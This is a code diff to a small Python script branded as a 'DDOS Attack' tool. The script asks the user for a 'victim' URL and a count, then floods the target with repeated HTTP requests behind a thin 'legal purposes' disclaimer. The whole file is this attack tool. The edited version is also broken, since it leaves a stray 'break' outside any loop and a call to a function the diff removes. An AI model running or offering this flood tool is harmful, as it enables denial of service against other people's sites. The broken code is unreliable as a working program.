@@ -1,5 +1,6 @@
 import pyfiglet
 from colorama import Fore, Style, init
+import requests
 
 # Initialize Colorama
 init(autoreset=True)
@@ -12,7 +13,7 @@ def print_attractive_text():
     # Define the text
     title = "ROOT RELUX"
     subtitle = "Made by JUNAYAD AHSAN"
-    description = "DDOS Attack"
+    description = "DDOS Attack Alpha"
 
     # Print the title in big letters
     print(Fore.CYAN + title_font.renderText(title))
@@ -21,34 +22,24 @@ def print_attractive_text():
     print(Fore.MAGENTA + f"By this code, people can know about {Style.BRIGHT}{description}.")
     print(Fore.RED + f"Use this tool for {Style.BRIGHT}legal purposes.")
 
+def send_request(url):
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            print("Request successful!")
+        else:
+            print("Request failed with status code:", response.status_code)
+    except Exception as e:
+        print("An error occurred:", str(e))
+
 if __name__ == "__main__":
     print_attractive_text()
-#Educational purpose
-name=float(input("How many times you attack victim?:"))
-import requests
-url=input('Input your victim url:')
+    
+    n = int(input("How many times do you want to send requests?: "))
+    url = input('Input your target URL: ')
 
-def base_url():
-    response = requests.get(url)
-    if response.status_code == 200:
-        print("Ddos attack successful!")
-    else:
-        print("GET request failed with status code:", response.status_code)
-counter = 0
-while counter <= name:
-    base_url()
-    print("Ddos attack is runinng")
-    break
-def post_url():
-    response = requests.post(url)
-    if response.status_code == 200:
-        print("Ddos attack successful!")
-    else:
-        print("Post request failed with status code:", response.status_code)
-counter = 0
-while counter <= name:
-    post_url()
-    print("Ddos attack is runing.")
+    for _ in range(n):
+        send_request(url)
     break
 if __name__ == "__main__":
     base_url()
